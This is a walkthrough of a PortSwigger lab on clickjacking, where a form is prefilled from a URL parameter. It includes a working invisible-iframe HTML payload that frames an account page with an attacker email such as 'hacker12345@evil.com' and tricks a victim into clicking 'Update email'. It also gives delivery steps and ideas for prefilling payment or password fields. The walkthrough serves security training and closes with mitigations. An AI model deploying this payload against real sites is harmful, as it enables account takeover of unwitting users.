# 📘 PortSwigger Lab: Clickjacking with form input data prefilled from a URL parameter

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/learning-paths/clickjacking/clickjacking-clickjacking-with-prefilled-form-input/clickjacking/lab-prefilled-form-input
> 🎯 Topic: Clickjacking (UI redressing) — Prefilled form input
> 🧪 Difficulty: Apprentice
> ✅ Status: Solved

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📡 Why Pre-population Matters](#prepopulation)
- [⚡ The Invisible iframe Technique](#iframe)
- [🔍 Step 1 — Discover the Pre-population Parameter](#step1)
- [🔍 Step 2 — Construct the Base Exploit Payload](#step2)
- [🔍 Step 3 — Calibrate the Decoy Element](#step3)
- [🔍 Step 4 — Cloak the Target Frame](#step4)
- [🔍 Step 5 — Deliver Exploit to Victim](#step5)
- [📨 Example HTML Payload](#examples)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Use UI redressing techniques to:

```text
1. Pre-populate the "Email" input field on the user's account page using a URL GET parameter.
2. Construct an HTML page that frames this pre-configured account settings page.
3. Trick a logged-in user into clicking a decoy button ("Click me").
4. Force the user to unknowingly click the hidden "Update email" button, changing their email to an attacker-controlled address.
```

<a id="theory"></a>

## 🧠 Short Theory
Clickjacking allows an attacker to hijack a user's clicks, but it **cannot hijack keystrokes**. If an attacker wants to force a user to transfer funds to a specific account or change their email address, simply overlaying a button isn't enough — the form needs to contain the attacker's data before the click happens.

To bypass this limitation, attackers look for forms that support **pre-population** via URL parameters (e.g., `?email=hacker@evil.com`). By embedding this modified URL into the iframe, the form is already filled out when the victim loads the page, reducing the entire attack to a single click.

<a id="idea"></a>

## 🧩 Core Idea
The target application allows users to update their email address and conveniently populates the email field if the `email` parameter is present in the GET request. The attacker exploits this convenience feature.

```text
Attacker site:      Renders a "Click me" button.
Hidden iframe:      Loads `/my-account?email=hacker@evil.com`.
Alignment:          Overlays the "Update email" button exactly on top of "Click me".
Victim clicks:      Browser sends a POST request with the prefilled email and a valid CSRF token.
Target server:      Updates the victim's email address ✅
```

<a id="prepopulation"></a>

## 📡 Why Pre-population Matters
Developers often implement URL-based form filling for marketing campaigns, user onboarding, or support links. However, if this functionality is combined with a lack of framing protections (`X-Frame-Options` or `CSP`), it turns a harmless convenience into a critical vulnerability, allowing attackers to define the exact payload that the victim will submit.

<a id="iframe"></a>

## ⚡ The Invisible iframe Technique
Just like basic clickjacking, the attacker aligns the invisible target element with a visible decoy using CSS:

```text
- opacity: 0.0001 (Makes the iframe virtually invisible to the human eye, but fully clickable).
- z-index: 2 (Places the iframe above the decoy element which has z-index 1).
- position: absolute/relative (Allows precise pixel-perfect alignment of elements).
```

<a id="step1"></a>

## 🔍 Step 1 — Discover the Pre-population Parameter
Log in to the vulnerable application (`wiener:peter`) and navigate to `/my-account`.

Test the URL for pre-population by appending standard parameters:
`https://LAB-ID.web-security-academy.net/my-account?email=hacker@test.com`

Verify that the "Email" field on the page is automatically filled with `hacker@test.com` without any keyboard input.

<a id="step2"></a>

## 🔍 Step 2 — Construct the Base Exploit Payload
Open the Exploit Server. In the Body section, insert the basic HTML structure. Ensure the `iframe src` includes the pre-population parameter.

```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:400px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://LAB-ID.web-security-academy.net/my-account?email=hacker@test.com"></iframe>
```

<a id="step3"></a>

## 🔍 Step 3 — Calibrate the Decoy Element
Set the iframe `opacity` to `0.1`.

Click **Store** and then **View exploit**.

Adjust the `top` and `left` pixel values of the `div` until the words "Test me" are perfectly centered underneath the **"Update email"** button.

*Caution: Do not click the button during testing, or you will change your own email and complicate the final payload delivery.*

<a id="step4"></a>

## 🔍 Step 4 — Cloak the Target Frame
Once alignment is perfect, finalize the payload for the victim:

- Change the decoy text from "Test me" to "Click me".
- Change the iframe `opacity` from `0.1` to `0.0001`.
- **Crucial:** Change the email address in the `src` URL to a completely fresh, unique email (e.g., `final_pwn@attacker.com`), because the system rejects emails that are already in use.

<a id="step5"></a>

## 🔍 Step 5 — Deliver Exploit to Victim
Click **Store** to save the final invisible payload.

Click **Deliver exploit to victim**.

The victim's browser will load the exploit, click the decoy button, and unknowingly submit the pre-filled form.

<a id="examples"></a>

## 📨 Example HTML Payload
Exploit Payload (Exploit Server Body)
```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:415px; 
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker12345@evil.com"></iframe>
```

<a id="response"></a>

## 📥 Example Result
Victim Interaction (Silent Success)
```text
1. Victim navigates to the Exploit Server URL.
2. The hidden iframe loads `/my-account?email=hacker12345@evil.com`.
3. Victim sees a blank page with a single "Click me" text and clicks it.
4. The click hits the "Update email" button.
5. The form is submitted. The victim's account email is successfully changed.
```

Lab status:

```text
Solved
```

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain
```text
1. Identify sensitive form (Email update).
2. Discover that the form supports pre-population via URL GET parameters.
3. Draft HTML payload framing the target site with the malicious URL parameter injected.
4. Overlay a decoy element beneath the "Update email" button.
5. Calibrate coordinates using semi-transparent opacity (0.1).
6. Ensure the injected email is unique.
7. Set opacity to 0.0001 to make the attack invisible.
8. Deliver the hosted HTML payload to the victim.
9. Lab marked as Solved.
```

<a id="breakdown"></a>

## 🔬 Why the Attack Worked
1. Lack of Framing Protections
No `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` headers were present.

2. Unsafe Pre-population
The application blindly trusted the GET parameter to fill a sensitive form field without requiring additional user confirmation.

3. Transparent Overlay
CSS layering (`z-index` and `opacity`) decoupled the visual representation of the page from the functional click targets.

<a id="pentester"></a>

## 🧠 Pentester Mindset
When testing web applications for advanced Clickjacking:

```text
If a form requires text input, does it read values from the URL query string?
Can I prepopulate fields like 'amount', 'destination_account', or 'new_password'?
Even if a site has CSRF tokens, can I bypass them by framing the prepopulated form?
```

<a id="mistakes"></a>

## ❌ Common Mistakes
Mistake 1. Reusing an already taken email address
The application logic prevents two users from having the same email. If you test the exploit on yourself and update your email to `test@test.com`, the final exploit sent to the victim will fail if it also uses `test@test.com`. Always use a fresh email for the final delivery.

Mistake 2. Forgetting the URL parameter
If you just frame `/my-account`, the user will click "Update email", but they will just be submitting their existing, unchanged email address back to the server.

<a id="defense"></a>

## 🛡 Mitigation
1. Prevent Framing (Primary Defense)
Implement `Content-Security-Policy: frame-ancestors 'none';` or `X-Frame-Options: DENY`.

2. Restrict Pre-population
Do not allow sensitive forms (like email updates, password changes, or wire transfers) to be pre-populated directly from URL parameters.

3. Require Explicit Confirmation
For critical state-changing actions, require the user to manually re-enter their current password or provide a secondary confirmation (like an OTP sent to the *old* email address) before applying changes.

<a id="checklist"></a>

## ✅ Checklist
Reconnaissance
- [ ] Logged in to the application
- [ ] Tested `/my-account?email=...` to confirm pre-population works
Payload Generation
- [ ] Created basic iframe and div structure
- [ ] Injected the malicious URL parameter into the iframe `src`
Execution & Verification
- [ ] Aligned decoy exactly beneath the "Update email" button
- [ ] Changed the target email to a unique value
- [ ] Changed text to "Click me" and opacity to `0.0001`
- [ ] Delivered exploit to victim
- [ ] Lab status: Solved

<a id="conclusion"></a>

## 🧾 Conclusion
The lab demonstrated how to escalate Clickjacking by combining it with URL pre-population:

```text
1. Proved that the inability to type text in clickjacking can be bypassed via GET parameters.
2. Successfully tricked the victim into submitting attacker-controlled data.
```

Main lessons:
```text
- URL-based form filling introduces significant risks if framing is allowed.
- Attackers can control both the action (the click) and the payload (the prefilled data).
- Defense in depth (framing protection + re-authentication) is crucial for sensitive forms.
```
[⬆ Back to top](#top)
